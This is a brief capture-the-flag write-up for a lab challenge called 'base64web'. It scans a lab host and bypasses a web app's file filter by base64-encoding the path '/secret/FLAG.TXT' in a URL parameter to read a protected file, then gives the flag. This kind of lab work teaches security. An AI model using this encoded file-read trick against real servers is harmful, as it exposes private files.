## base64web

nmap 10.10.0.195 --
port 8080 is open
it hosts a website with 4 subpages

* Encoder -- textarea form that encodes b64
* Decoder -- textarea form that decodes b64
* Dir -- shows a directory-listing of /secret/ which contains FLAG.TXT
* Dateien -- shows "hello.html"

- Dateien url looks like:
`http://10.10.0.195:8080/file/?file=hello.html`

- when you simply try `http://10.10.0.195:8080/file/?file=/secret/FLAG.TXT` you get:
`Dont even try THIS`

Since the challenge is called base64web and contains a b64 decoder and encoder you
can just try to encode `/secret/FLAG.TXT` with the b64 encoder
and then `http://10.10.0.195:8080/file/?file=L3NlY3JldC9GTEFHLlRYVA==`
you get `RE9SRjE4e1NFVlNSVk5aVDFWU1JreEJSeUVLfQo=`
and put it in the decoder
and get the flag:

### FLAG
DORF18{SEVSRVNZT1VSRkxBRyEK}